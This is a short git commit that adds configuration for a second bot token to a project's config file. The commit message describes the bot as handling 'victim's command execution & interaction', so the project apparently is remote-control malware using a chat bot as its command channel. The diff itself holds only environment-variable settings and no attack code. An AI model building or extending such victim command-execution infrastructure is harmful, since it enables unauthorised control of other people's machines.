86aaa47c922879f3c7114227e762724074e8ec47
MowlandCodes <mowlandgaming@gmail.com>
2025-07-21 11:27:23 +0700

    edit: added ALPHA bot for handling victim's command execution & interaction

--- config/config.py
+++ config/config.py
@@ -13,6 +13,10 @@ BOT_USERNAME = str(os.environ.get("BOT_USERNAME"))
 CHAT_ID = str(os.environ.get("CHAT_ID"))
 OP_ID = str(os.environ.get("OP_ID"))
 
+# Victim Bot (To interact with victim)
+ALPHA_BOT_TOKEN = str(os.environ.get("ALPHA_BOT_TOKEN"))
+ALPHA_BOT_USERNAME = str(os.environ.get("ALPHA_BOT_USERNAME"))
+
 
 LOG_RED = lambda x: f"{Back.RED}{Fore.BLACK}{Style.BRIGHT} {x} {Style.RESET_ALL}"
 LOG_YELLOW = lambda x: f"{Back.YELLOW}{Fore.BLACK}{Style.BRIGHT} {x} {Style.RESET_ALL}"
